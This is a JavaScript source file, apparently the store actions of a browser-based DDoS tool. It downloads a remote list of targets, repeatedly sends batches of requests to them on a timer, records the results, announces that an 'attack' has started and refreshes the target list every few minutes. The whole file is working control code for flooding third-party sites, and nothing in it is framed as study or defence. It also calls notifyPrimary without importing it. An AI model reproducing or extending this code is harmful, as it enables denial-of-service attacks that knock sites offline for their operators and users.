import { fetchTargets } from 'src/modules/api'
import { initSendReqests, startAttackNotify } from 'src/modules/ddos/ddosAttack'
import { notifyError } from 'src/modules/notify'
// import { analytics } from 'src/modules/analytics'
import { i18n } from 'src/modules/i18n'

/**
 * Request default targets list
 */
export const setDefaultTargets = async ctx => {
  try {
    const respTargets = await fetchTargets(ctx.getters.getTargetsFileUrl)

    ctx.commit('setInitTargets', respTargets)
  } catch (error) {
    notifyError(i18n('attackConfigPage.errorReqDefaultNotify'))
    console.error(error)
  }
}

/**
 * Init browser attack ctx
 */
export const initBrowserAttack = ctx => {
  // analytics.track('init-browser-ddos')

  const config = ctx.getters.getDdosConfig.user

  if (ctx.getters.getTargetsList.length === 0) {
    return
  }

  const lastIntervalId = ctx.getters.getBrowserAttackIntervalId

  // Change attack status to active
  ctx.commit('setBrowserAttackStatus', true)

  // Last requested index in targets
  let lastIndex = 0

  // Create setInterval
  const reqInterval = setInterval(
    async () => {
      if (!ctx.getters.getBrowserAttackStatus) return

      const targets = ctx.getters.getTargetsList

      // Generate from/to for user param reqCount
      const from = lastIndex >= targets.length ? 0 : lastIndex + 1
      const to = from + config.reqCount
      lastIndex = to

      // Array with targets for request
      const targetsListForReq = targets.slice(from, to)

      // If there are fewer elements in the array than specified in the config, we duplicate the existing ones
      // TODO There is a problem with the counting logic
      // if (targetsListForReq.length < config.reqCount) {
      //   targetsListForReq.push(
      //     ...targetsListForReq.slice(
      //       0,
      //       config.reqCount - targetsListForReq.length,
      //     ),
      //   )
      // }

      // Send requests array
      const respList = await initSendReqests(targetsListForReq, ctx)

      // write reqs resultst to store
      ctx.commit('setResultsBrowserAttack', respList)
    },
    Number(config.intervalLength) ? Number(config.intervalLength) : 1000,
  )

  // set setInterval id ti store
  ctx.commit('setBrowserAttackIntervalId', reqInterval)

  if (!lastIntervalId) {
    // TODO fix this (req startAttackNotify before header mounted)
    setTimeout(() => {
      startAttackNotify()
    }, 1000)
  }

  ctx.dispatch('initTargetsAutoUpdateInterval')
}

/**
 * Destroy browser attack
 */
export const destroyBrowserAttack = ctx => {
  // analytics.track('destroy-browser-ddos')
  const reqIntevalId = ctx.getters.getBrowserAttackIntervalId

  clearInterval(reqIntevalId)
  ctx.commit('setBrowserAttackIntervalId', null)
  ctx.commit('setBrowserAttackStatus', false)

  ctx.dispatch('destroyTargetsAutoUpdateInterval')
}

/**
 * Initialize Targets Auto-Update task
 */
export const initTargetsAutoUpdateInterval = ctx => {
  const isBrowserAttackStarted = ctx.getters.getBrowserAttackStatus
  const isTargetsAutoUpdateEnabled = ctx.getters.getIsTargetsAutoUpdateEnabled
  const targetsAutoUpdateInterval = ctx.getters.getTargetsAutoUpdateInterval

  if (!isBrowserAttackStarted || !isTargetsAutoUpdateEnabled || !targetsAutoUpdateInterval) return

  const targetsUpdateIntervalId = ctx.getters.getTargetsAutoUpdateIntervalId
  targetsUpdateIntervalId && clearInterval(targetsUpdateIntervalId)

  const intervalId = setInterval(async () => {
    await ctx.dispatch('setDefaultTargets')

    notifyPrimary(i18n('attackConfigPage.targetsAutoUpdate.notification'))
  }, targetsAutoUpdateInterval * 60 * 1000)

  ctx.commit('setTargetsAutoUpdateIntervalId', intervalId)
}

/**
 * Destroy Targets Auto-Update task
 */
export const destroyTargetsAutoUpdateInterval = ctx => {
  const targetsUpdateIntervalId = ctx.getters.getTargetsAutoUpdateIntervalId

  targetsUpdateIntervalId && clearInterval(targetsUpdateIntervalId)

  ctx.commit('setTargetsAutoUpdateIntervalId', null)
}

/**
 * Handle Targets Auto-Update settings
 */
export const setTargetsUpdateSettings = (ctx, settings) => {
  ctx.commit('setDdosConfig', settings)

  const { isTargetsAutoUpdateEnabled, targetsAutoUpdateInterval } = settings

  if (isTargetsAutoUpdateEnabled && targetsAutoUpdateInterval) {
    ctx.dispatch('initTargetsAutoUpdateInterval')
  } else {
    ctx.dispatch('destroyTargetsAutoUpdateInterval')
  }
}
